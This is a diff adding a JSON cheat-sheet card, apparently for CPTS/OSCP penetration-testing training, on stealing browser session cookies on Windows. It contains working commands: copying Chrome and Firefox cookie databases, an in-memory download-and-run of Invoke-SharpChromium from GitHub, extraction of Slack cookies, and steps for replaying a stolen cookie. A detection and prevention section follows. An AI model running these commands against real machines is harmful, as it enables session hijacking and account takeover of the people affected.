@@ -1,0 +1,95 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "sharpchromium",
+    "python"
+  ],
+  "tags": [
+    "cookies",
+    "session-hijack",
+    "browsers"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Pillaging",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Stage the Chrome cookie DB where SharpChromium expects it",
+      "command": "copy \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies\""
+    },
+    {
+      "label": "Load Invoke-SharpChromium in-memory",
+      "command": "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')"
+    },
+    {
+      "label": "Extract cookies for a target domain",
+      "command": "Invoke-SharpChromium -Command \"cookies slack.com\""
+    },
+    {
+      "label": "Firefox route: copy cookies.sqlite + cookieextractor",
+      "command": "# copy cookies.sqlite; python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d"
+    }
+  ],
+  "notes": "=== Browser Cookie Theft — Session Hijacking Without Credentials ===\nSteal long-lived session cookies from browsers to impersonate authenticated users.\n\n=== WHY COOKIES OVER PASSWORDS ===\nLong-lived session cookies bypass MFA — authentication already completed\nSlack \"d\" cookie: 10+ year lifetime in many configurations\nValid even after password change (until explicit logout or session invalidation)\nMore stealthy than credential use — matches existing session pattern\n\n=== FIREFOX COOKIE EXTRACTION ===\nFirefox stores cookies in SQLite: %APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite\nScript copies while handling random profile directory name:\n  copy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default\\cookies.sqlite .\\\n\nExtract Slack cookie:\n  python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d\n  → Returns plaintext session cookie value\n\n=== CHROMIUM/CHROME COOKIE EXTRACTION ===\nChrome encrypts cookies with DPAPI + AES key (see SharpChrome card for full mechanism)\n  .\\SharpChrome.exe cookies   → decrypts and outputs all cookies\n  .\\SharpChrome.exe cookies /target:C:\\Users\\<user>\\   → specific user\n\nChrome cookie database path:\n  %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies (newer Chrome: Network\\Cookies)\n  Must copy the file before querying (Chrome locks it while running)\n\n=== USING THE STOLEN COOKIE ===\n1. Install Cookie-Editor browser extension\n2. Open target website (e.g., slack.com)\n3. Cookie-Editor → Add or modify cookie named \"d\" with stolen value\n4. Refresh page → Authenticated as victim\n\n=== CHAINING CONTEXT ===\nSlack cookie theft → access all internal channels → internal communications, credentials, secrets\nGitHub cookie → access private repositories → source code, API keys, deployment credentials\nCorporate SSO cookie → access all SSO-integrated applications without re-authentication\nCloud console cookie → AWS/Azure portal access → enumerate/escalate cloud resources\n\n=== WHAT TO LOOK FOR ===\nFirefox on target = easiest (plaintext cookies, no DPAPI)\nChrome on target = SharpChrome needed (runs in user context, DPAPI decryptable)\nPriority targets: Slack, GitHub, GitLab, cloud consoles, internal ticketing, SSO portals\nCookies are user-specific → run after each new user account compromise",
+  "references": [
+    {
+      "title": "SharpChromium (djhohnstein)",
+      "url": "https://github.com/djhohnstein/SharpChromium"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sharpchrome-logins",
+      "note": "Grab saved passwords from the same browser.",
+      "rel": "alternative"
+    },
+    {
+      "id": "mremoteng-decrypt",
+      "note": "Earlier pillaging step.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "browser-cookie-theft",
+  "name": "Pillaging - Steal Browser Cookies",
+  "command": "Invoke-SharpChromium -Command \"cookies slack.com\"",
+  "description": "Extract session cookies to hijack authenticated web sessions (e.g. Slack). SharpChromium pulls Chrome cookies; for Firefox, copy cookies.sqlite and extract with cookieextractor.py.",
+  "opsec": "loud",
+  "mitre": [
+    "T1539"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Session cookies for web applications (Slack, GitHub, internal portals) are stored in browser SQLite databases. Unlike login credentials, session cookies do not require the user's password — they represent an active authenticated session. Copying Chrome's cookies.sqlite (or equivalent) while Chrome is not running, then importing into an attacker-controlled browser, hijacks active sessions.",
+    "prerequisites": "Shell access as the target user. Chrome/Firefox not locked (or copy made while it's running). SQLite database accessible. Knowledge of target application session cookie name.",
+    "impact": "Hijacking active sessions in web applications without knowing passwords. Enables access to Slack workspaces, GitHub repositories, internal corporate portals, and any web application with active session cookies for the compromised user.",
+    "detection": "Read access to Chrome Cookie database by non-Chrome process. Transfer of cookie database files to external location. New session established from unexpected IP immediately after cookie file access. Web application session anomaly detection.",
+    "artifacts": "File access: Chrome Cookies or Firefox cookies.sqlite read by non-browser process | Network: cookie database transferred to attacker | Application log: new session from unexpected geographic/IP location",
+    "prevention": "Enable session binding to source IP or device fingerprint in web applications. Use short session TTLs. Deploy web application session anomaly detection. Avoid RDP to servers where admin also uses web applications — session cookies on server are at risk.",
+    "misconfiguration": "Web applications use long-lived session cookies without IP binding. User performs sensitive web browsing on the same machine where a low-privilege attacker has shell access.",
+    "vulnerable_config": "# Copy Chrome cookies DB (while Chrome is closed):\ncopy 'C:\\Users\\bob.randall\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' .\\Cookies.db\n\n# SQLite query for Slack session:\n$query = 'SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE \".slack.com\"'\nInvoke-SqliteQuery -Database .\\Cookies.db -Query $query",
+    "secure_config": "# Application-side mitigations:\n# Enable session binding to IP/device\n# Short session TTL (e.g., 8 hours)\n# Enforce re-authentication for sensitive operations\n\n# OS-side:\n# Encrypt user profile with BitLocker (protects offline access)\n# Use separate user accounts for web browsing vs administration\n\n# Monitor Chrome Cookie DB access by non-Chrome processes",
+    "sources": [
+      "HTB M26",
+      "MITRE T1539",
+      "MITRE T1552"
+    ]
+  }
+}
